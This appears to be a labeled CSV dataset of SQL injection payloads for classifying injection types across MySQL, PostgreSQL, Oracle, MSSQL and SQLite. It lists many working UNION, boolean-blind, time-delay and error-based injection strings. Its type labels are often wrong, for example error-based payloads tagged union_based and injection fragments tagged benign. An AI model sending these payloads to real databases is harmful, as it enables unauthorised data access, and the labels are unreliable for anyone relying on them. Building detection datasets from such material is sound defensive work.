id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19401,"-4596"" union all select 5761#",union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
19403,"-6419 union all select 7008,7008,7008,7008,7008--",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
19410,"1%"" ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
19411,"-7553%"" or 3571 = 2886",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
19415,"-2453"" ) union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
19422,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
19431,"1%"" ) and 8626 = 3626#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
19438,"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
19449,1 ) as ratg where 3033 = 3033 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
19451,"1' ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
19453,"1 union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
19457,1' ) union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 27 chars.,2
19459,"-4711' in boolean mode ) union all select 8007,8007,8007,8007,8007,8007--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
19461,"-8129' ) ) ) union all select 4531,4531,4531#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
19462,"1"" ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
19465,1' ) as gogu where 4338 = 4338 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
19466,"-6096' ) where 1316 = 1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
19471,"1"" ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
19472,"1 ) as mnyy where 4409 = 4409 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
19474,"-7580' ) ) as mmqt where 3468 = 3468 union all select 3468,3468,3468,3468,3468,3468#",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
19475,"1%"" union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
19478,"1' ) as jysm where 8961 = 8961 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
19482,"1"" where 9332 = 9332 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
19485,"-3249' ) ) ) union all select 6309,6309#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
19489,"-7741' ) where 8271 = 8271 union all select 8271,8271,8271,8271,8271,8271,8271#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
19490,"-5009 ) where 8463 = 8463 union all select 8463,8463,8463,8463,8463,8463--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
19493,"-4305 ) as ldrt where 2567 = 2567 union all select 2567,2567,2567,2567,2567,2567,2567#",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
19497,"1 ) ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
19501,1' ) where 5280 = 5280 and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
19509,"1"" ) ) ) and 4967 = 8866 and ( ( ( ""jzyn"" like ""jzyn",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
19515,"-9922' ) ) union all select 2193,2193,2193--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
19522,"1 where 4477 = 4477 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
19525,"1 where 2751 = 2751 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
19531,"-6948"" ) ) as ojjl where 1300 = 1300 or 6872 = 6872--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
19534,"-1917"" ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
19542,-3436 ) or 9281 = 3172,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
19543,"-1907"" ) ) or 2782 = 3591",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
19548,1%' ) ) ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
19558,-7548 or 2850 = 9666,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
19559,"-2743 union all select 6757,6757,6757,6757,6757,6757--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
19561,-8911%' or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
19565,"-6200' where 9150 = 9150 union all select 9150,9150,9150,9150,9150,9150,9150#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
19583,-9217 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
19585,"1' union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
19593,"-3719"" union all select 6609,6609,6609,6609#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
19596,-2781 ) ) ) or 2573 = 5848--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
19598,"-5548' where 4477 = 4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",union_based,generic,0.7,UNION-based payload detected. Payload length: 93 chars.,2
19413,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'gtcb' = 'gtcb",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
19417,"1' ) ) as lizu where 7691 = 7691 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
19447,1 rlike sleep ( 5 ) -- muhp,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
19470,"1%' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
19502,"1%"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
19508,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""squx"" like ""squx",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
19523,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""yzjl"" like ""yzjl",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
19549,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'aytf' like 'aytf",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
19560,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'lshk' like 'lshk",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
19572,"1%"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
19577,"1"" ) where 7919 = 7919 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
19408,"-5587%' ) or elt ( 1032 = 1032,3623 ) and ( '%' = '",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
19428,1' ) ) as hxxm where 3792 = 3792 and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
19450,-7404' where 1536 = 1536 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 36 chars.,1
19480,"1"" ) and sleep ( 5 ) and ( ""ytof"" = ""ytof",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
19535,"1"" and elt ( 2373 = 5817,5817 ) and ""rsdt"" = ""rsdt",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
19576,1' ) ) or sleep ( 5 ) and ( ( 'taaj' = 'taaj,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
19437,"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'oacz' = 'oacz",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,1
19468,"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""ieuj"" like ""ieuj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,1
19483,-2432' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'ejhp' = 'ejhp,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1
19495,"1' and make_set ( 8403 = 8403,8899 ) and 'niux' = 'niux",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1
19496,end and ( 4610 = 4610,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,1
19536,1' ) ) ) and ( 8982 = 8027 ) *8027 and ( ( ( 'qkrv' = 'qkrv,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,1
19552,"-4012"" ) or make_set ( 9354 = 9354,7185 ) and ( ""ccfn"" = ""ccfn",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
19562,"1 ) ) and make_set ( 8554 = 3286,3286 ) and ( ( 7385 = 7385",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,1
19421,1 ) ) as cwyb where 3633 = 3633,benign,generic,0.5,. Payload length: 31 chars.,1
19454,1' ) as rhvm where 1420 = 1420,benign,generic,0.5,. Payload length: 30 chars.,1
19473,"1"" where 9725 = 9725",benign,generic,0.5,. Payload length: 20 chars.,1
19481,"1"" ) as pobe where 1704 = 1704",benign,generic,0.5,. Payload length: 30 chars.,1
19487,1' ) as nexa where 6740 = 6740,benign,generic,0.5,. Payload length: 30 chars.,1
19554,1' ) ) as dqby where 9256 = 9256,benign,generic,0.5,. Payload length: 32 chars.,1
19568,1 ) ) as xyuy where 6894 = 6894,benign,generic,0.5,. Payload length: 31 chars.,1
19574,"1"" ) as wmng where 5976 = 5976",benign,generic,0.5,. Payload length: 30 chars.,1
19587,1' ) as fxid where 5926 = 5926,benign,generic,0.5,. Payload length: 30 chars.,1
19594,"1"" ) ) as cduw where 4495 = 4495",benign,generic,0.5,. Payload length: 32 chars.,1
19595,1' ) ) as gchn where 5856 = 5856,benign,generic,0.5,. Payload length: 32 chars.,1
19402,"1"" where 5353 = 5353 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
19404,"-9180"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
19405,-8828 ) ) as ospo where 2141 = 2141 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
19407,1'+ ( select 'mdxt' where 2733 = 2733 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
19409,"-6431' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'ixix' like 'ixix",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
19424,"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
19426,"-5073"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""kbab"" like ""kbab",union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
19427,select ( case when ( 4774 = 1535 ) then 4774 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
19436,select pg_sleep ( 5 ) and ( ( 4382 = 4382,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
19439,"1'+ ( select mems where 5091 = 5091 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
19440,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) # cqqs",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
19441,"1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
19442,"1'+ ( select 'otqy' where 2754 = 2754 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
19443,"1 ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 3626 = 3626",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
19444,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'qcsi' = 'qcsi",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
19445,"1 ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 5776 = 5776",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
19446,"1 ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 9401 = 9401",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
19448,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) -- saxs,union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
19452,1 ) as cinw where 3732 = 3732 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
19456,-2756' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
19460,"1%"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""%"" = """,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
19463,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
19467,"1, ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
19479,1' ) ) as xcvg where 1157 = 1157 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
19492,1'+ ( select shec where 3589 = 3589 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) +',union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
19494,-4322' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
19503,1 ) where 3565 = 3565 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
19505,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
19506,"1"" where 9760 = 9760 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
19512,"1"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""uwdz"" = ""uwdz",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
19519,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'uqfs' = 'uqfs,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
19520,"-9959"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vcwc"" = ""vcwc",union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
19524,"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'mymg' = 'mymg",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
19526,"1%"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""%"" = """,union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
19527,1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 3530 = 3530,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
19533,"1"" ) ) as ndbk where 5042 = 5042 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
